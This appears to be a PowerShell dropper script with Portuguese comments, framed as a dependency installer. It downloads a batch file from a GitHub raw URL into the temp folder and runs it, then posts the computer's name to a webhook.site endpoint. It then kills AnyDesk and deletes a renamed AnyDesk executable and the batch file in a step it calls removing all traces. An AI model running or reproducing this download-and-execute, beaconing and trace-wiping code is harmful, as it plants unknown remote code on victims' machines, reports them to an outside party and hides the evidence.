# 1. Configurações de links e caminhos
$urlBat = "https://raw.githubusercontent.com/arthurcsilva109-create/russo353/refs/heads/main/instalar_dependencias.bat"
$caminhoBat = "$env:TEMP\instalar_dependencias.bat"
$caminhoExe = "$env:TEMP\Any_Russo.exe"
$webhook = "https://webhook.site/1070b89e-8689-4293-b09a-2e166cfba592"

# 2. Configura o protocolo de segurança para o download não falhar
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Write-Host ">>> Iniciando processamento..." -ForegroundColor Cyan

# 3. Baixa o arquivo .bat do GitHub
try {
    Invoke-WebRequest -Uri $urlBat -OutFile $caminhoBat -UseBasicParsing
    Write-Host "[OK] Script BAT baixado." -ForegroundColor Green
} catch {
    Write-Host "[ERRO] Falha ao baixar o arquivo BAT." -ForegroundColor Red
    exit
}

# 4. Executa o arquivo .bat e aguarda ele terminar
Write-Host ">>> Executando dependencias..." -ForegroundColor Yellow
Start-Process -FilePath $caminhoBat -Wait -WindowStyle Normal

# 5. Envia a confirmação de término para o Webhook
$dados = @{
    pc = $env:COMPUTERNAME
    status = "Dependencias Instaladas e Limpeza Concluida"
    data = (Get-Date).ToString()
} | ConvertTo-Json

try {
    Invoke-RestMethod -Uri $webhook -Method Post -Body $dados -ContentType "application/json"
    Write-Host "[OK] Notificacao enviada ao painel." -ForegroundColor Green
} catch {
    Write-Host "[!] Falha ao avisar o Webhook." -ForegroundColor Gray
}

# 6. Limpeza total de rastros
Write-Host ">>> Finalizando e limpando arquivos..." -ForegroundColor Cyan
Stop-Process -Name "AnyDesk" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# Deleta o executável do AnyDesk e o arquivo .bat
if (Test-Path $caminhoExe) { Remove-Item -Force $caminhoExe }
if (Test-Path $caminhoBat) { Remove-Item -Force $caminhoBat }

Write-Host ">>> PROCESSO CONCLUIDO COM SUCESSO." -ForegroundColor Green
Start-Sleep -Seconds 3
